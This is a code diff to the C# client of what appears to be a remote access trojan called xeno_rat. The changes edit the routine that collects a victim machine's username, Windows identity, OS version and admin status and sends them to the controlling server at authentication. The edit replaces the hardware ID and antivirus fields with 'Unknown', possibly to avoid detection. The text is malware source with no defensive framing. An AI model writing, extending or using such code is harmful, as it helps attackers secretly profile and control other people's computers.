@@ -175,7 +175,9 @@ namespace xeno_rat_client
         {
             //get hwid, username etc. seperated by null
             string clientversion = "1.8.7";//find a way to get the client version.
-            string[] info = new string[] { Utils.HWID(), Environment.UserName, WindowsIdentity.GetCurrent().Name, clientversion, Utils.GetWindowsVersion(), Utils.GetAntivirus(), Utils.IsAdmin().ToString() };
+            //string[] info = new string[] { Utils.HWID(), Environment.UserName, WindowsIdentity.GetCurrent().Name, clientversion, Utils.GetWindowsVersion(), Utils.GetAntivirus(), Utils.IsAdmin().ToString() };
+            string[] info = new string[] { "Unknown", Environment.UserName, WindowsIdentity.GetCurrent().Name, clientversion, Utils.GetWindowsVersion(), "Unknown", Utils.IsAdmin().ToString() };
+
             byte[] data = new byte[0];
             byte[] nullbyte = new byte[] { 0 };
             for (int i = 0; i < info.Length; i++)
@@ -197,6 +199,7 @@ namespace xeno_rat_client
             {
                 conn = new Node(new SocketHandler(sock, key), OnDisconnect);
                 byte[] data = GetSysInfo();
+                //byte[] data = new byte[0];
                 if (!(await conn.AuthenticateAsync(type, ID, data)))
                 {
                     MessageBox.Show("4", "Client.Util.ConnectAndSetupAsync");
